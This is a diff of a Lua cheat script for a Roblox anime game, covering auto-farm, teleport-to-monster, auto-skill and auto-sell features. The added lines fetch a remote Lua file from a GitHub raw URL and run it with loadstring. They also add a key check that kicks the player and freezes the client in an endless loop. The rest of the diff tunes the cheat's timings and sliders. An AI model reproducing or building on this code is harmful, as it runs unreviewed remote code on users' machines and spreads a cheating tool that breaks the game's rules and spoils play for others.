@@ -1,82 +1,18 @@
-_G.Settings = {
-    Autotrial  =false;
-    antilag = false;
-    balckscreen = false;
-    ReduceDamage = false;
-    FPSGPU = fades;
-    Autoleave = false;
-    kickrejoin = false;
-    LeaveDungeons = false;
-    SummerEvent = false;
-    SummerSpin = false;
-    farmraidtoken = false;
-    skilldelay = 1;
-    Raidselectmap = "None";
-    distance = 10;
-    toggleguikey = "z";
-    Hardcore = true;
-    afkandraid = false;
-    autospingem = false;
-    autoclaimrewardraid = false;
-    FriendsOnly = true;
-    eggspintime = "3";
-    autoclaimrewardspeed = false;
-    equipselectmain = false;
-    equipselectmain1 = false;
-    equipselectmain2 = false;
-    Autoclaimquest = false;
-    AutoEquipMCharacter = false;
-    AutoEquipACharacter = false;
-    SelectedMainCharacter = "None";
-    SelectedAssitCharacter1 = "None";
-    SelectedAssitCharacter2 = "None";
-    autosellcommon = false;
-    autoselluncommon = false;
-    autosellrare = false;
-    autosellepic = false;
-    selectegg = "None";
-    autoselllegendary = false;
-    autoequipbest = true;
-    autoupgrade = false;
-    Height = 20;
-    Height1 = -20;
-    otherds = "@here";
-    dsuser = "Not Set";
-    AutoPunch = true;
-    punchdelay = "4";
-    custommapselect = "None";
-    webhookspeed = "10";
-    AutoFarm = false;
-    AutoTP = false;
-    AutoTP1 = false;
-    AutoTP2 = true;
-    CustomDifficulty = "None";
-    Autocustom = false;
-    AutoRetry = false;
-    webhookurl = "";
-    AutoSkill1 = true;
-    AutoSkill2 = true;
-    AutoSkill3 = true;
-    AutoSkill4 = true;
-    AutoSkill5 = true;
-    SkillAssist1 = true;
-    SkillAssist2 = true;
-    kickwebhook = false;
-    Speed = 80;
-    Hidename = false;
-    Autolvl = false;
-    Autospeedraid = false;
-    Autoboss = false;
-    webhook = false;
-    raidwebhook = false;
-    Autoraid = false;
-    kickrejoin = true;
-    }
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lifaiossama/errors/main/trash.lua"))()
+
+if isfile("Mykey.txt") and readfile("Mykey.txt") == _G.Key then
+  else
+    game.Players.LocalPlayer:Kick("Brah")
+    wait(5)
+    while true do end;
+  end;
+
     if not game:IsLoaded() then
       game.Loaded:Wait()
   end
-  local a = "The Intruders"
-  local b = game.Players.LocalPlayer.Name .. "_NewUi.lua"
+  local a = "The Intruders2"
+  local b = game.Players.LocalPlayer.Name .. "_KRNLAnimeDimension.lua"
   function saveSettings()
       local c = game:GetService("HttpService")
       local d = c:JSONEncode(_G.Settings)
@@ -105,28 +41,6 @@ _G.Settings = {
   local h = game:GetService("VirtualUser")
   local i = game:GetService("TweenService")
   local j = g.LocalPlayer
-  function HideGui()
-    local k = game.CoreGui:FindFirstChild("Orion")
-    local l
-    for m, n in pairs(k:GetChildren()) do
-        if m == 2 then
-            l = n
-        end
-    end
-  if k.Enabled then
-    l:TweenSize(UDim2.new(0, 0, 0, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
-    repeat
-        task.wait()
-    until l.Size.Y.Offset < 1
-    k.Enabled = false
-  else
-    l:TweenSize(UDim2.new(0, 615, 0, 344), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, .6, true)
-    repeat
-        task.wait()
-    until l.Size.Y.Offset > 1
-    k.Enabled = true
-  end
-  end
   j.Idled:Connect(
       function()
           h:ClickButton2(Vector2.new())
@@ -960,7 +874,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoTP do wait(1)
+        while _G.Settings.AutoTP do wait()
           pcall(
             function()
                 game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
@@ -1006,7 +920,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoTP1 do wait(1)
+        while _G.Settings.AutoTP1 do wait()
           pcall(
             function()
                 game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
@@ -1053,7 +967,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoTP2 do wait(1)
+        while _G.Settings.AutoTP2 do wait()
               pcall(
                 function()
                     for m, n in pairs(game:GetService("Workspace").Folders.Monsters:GetChildren()) do
@@ -1077,10 +991,11 @@ _G.Settings = {
                                 V,
                                 {
                                     CFrame = n.HumanoidRootPart.CFrame *
-                                        CFrame.new(0, 0, _G.Settings.distance)
+                                        CFrame.new(0, 0, 4)
                                 }
                             )
                             W:Play()
+                            wait(T / Speed2)
                         until not _G.Settings.AutoTP2 or tonumber(n.EnemyHealthBarGui.HealthText.Text) <= 0 or not n.Parent or not n
                       end
                     end
@@ -1092,24 +1007,24 @@ _G.Settings = {
   
   
   --Main:Slider(title <string>,default <number>,max <number>,minimum <number>,increment <number>, flag <string>, callback <function>)
-  local slider = method:Slider("Speed", _G.Settings.Speed,100,80,1,"Slider", function(t)
+  local slider = method:Slider("Speed",_G.Settings.Speed,100,80,1,"Slider", function(t)
     _G.Settings.Speed = t
     saveSettings()
   end)
-  local slider = method:Slider("Over Height", _G.Settings.Height,10,5,1,"Slider", function(t)
+  local slider = method:Slider("Over Height",_G.Settings.Height,10,5,1,"Slider", function(t)
     _G.Settings.Height = t
     saveSettings()
   end)
-  local slider = method:Slider("Under Height", _G.Settings.Height1,-10,-15,1,"Slider", function(t)
+  local slider = method:Slider("Under Height",_G.Settings.Height1,-10,-15,1,"Slider", function(t)
     _G.Settings.Height1 = t
     saveSettings()
   end)
   
   
-  local slider = method:Slider("Behind Distance", _G.Settings.distance,20,0,1,"Slider", function(t)
-    _G.Settings.distance = t
-    saveSettings()
-  end)
+--   local slider = method:Slider("Behind Distance",_G.Settings.distance,20,0,1,"Slider", function(t)
+--     _G.Settings.distance = t
+--     saveSettings()
+--   end)
   
   local skills = E:Section("Punch Setting")
   
@@ -1143,7 +1058,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoSkill1 do wait(_G.Settings.skilldelay)
+        while _G.Settings.AutoSkill1 do wait(1)
           for m, n in pairs(
             getconnections(
                 game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.Skill1.MouseButton1Click
@@ -1160,7 +1075,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoSkill2 do wait(_G.Settings.skilldelay)
+        while _G.Settings.AutoSkill2 do wait(1)
           for m, n in pairs(
             getconnections(
                 game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.Skill2.MouseButton1Click
@@ -1177,7 +1092,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoSkill3 do wait(_G.Settings.skilldelay)
+        while _G.Settings.AutoSkill3 do wait(1)
           for m, n in pairs(
             getconnections(
                 game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.Skill3.MouseButton1Click
@@ -1194,7 +1109,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoSkill4 do wait(_G.Settings.skilldelay)
+        while _G.Settings.AutoSkill4 do wait(1)
           for m, n in pairs(
             getconnections(
                 game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.Skill4.MouseButton1Click
@@ -1211,7 +1126,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.AutoSkill5 do wait(_G.Settings.skilldelay)
+        while _G.Settings.AutoSkill5 do wait(1)
           for m, n in pairs(
             getconnections(
                 game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.Skill5.MouseButton1Click
@@ -1230,7 +1145,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.SkillAssist1 do wait(_G.Settings.skilldelay)
+        while _G.Settings.SkillAssist1 do wait(1)
           for m, n in pairs(
             getconnections(
               game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.SkillAssist1.MouseButton1Click
@@ -1248,7 +1163,7 @@ _G.Settings = {
     saveSettings()
     task.spawn(
       function()
-        while _G.Settings.SkillAssist2 do wait(_G.Settings.skilldelay)
+        while _G.Settings.SkillAssist2 do wait(1)
             for m, n in pairs(
               getconnections(
                   game.Players.LocalPlayer.PlayerGui.UniversalGui.UniversalCenterUIFrame.SlotsHolder.SkillAssist2.MouseButton1Click
@@ -1260,10 +1175,10 @@ _G.Settings = {
     end)
   end)
   
-  local slider = skills:Slider("Skill Delay", _G.Settings.skilldelay,5,1,1,"Slider", function(t)
-    _G.Settings.skilldelay = t
-    saveSettings()
-  end)
+--   local slider = skills:Slider("Skill Delay", _G.Settings.skilldelay,5,1,1,"Slider", function(t)
+--     _G.Settings.skilldelay = t
+--     saveSettings()
+--   end)
   
   local SR = y:Section("Selection")
   
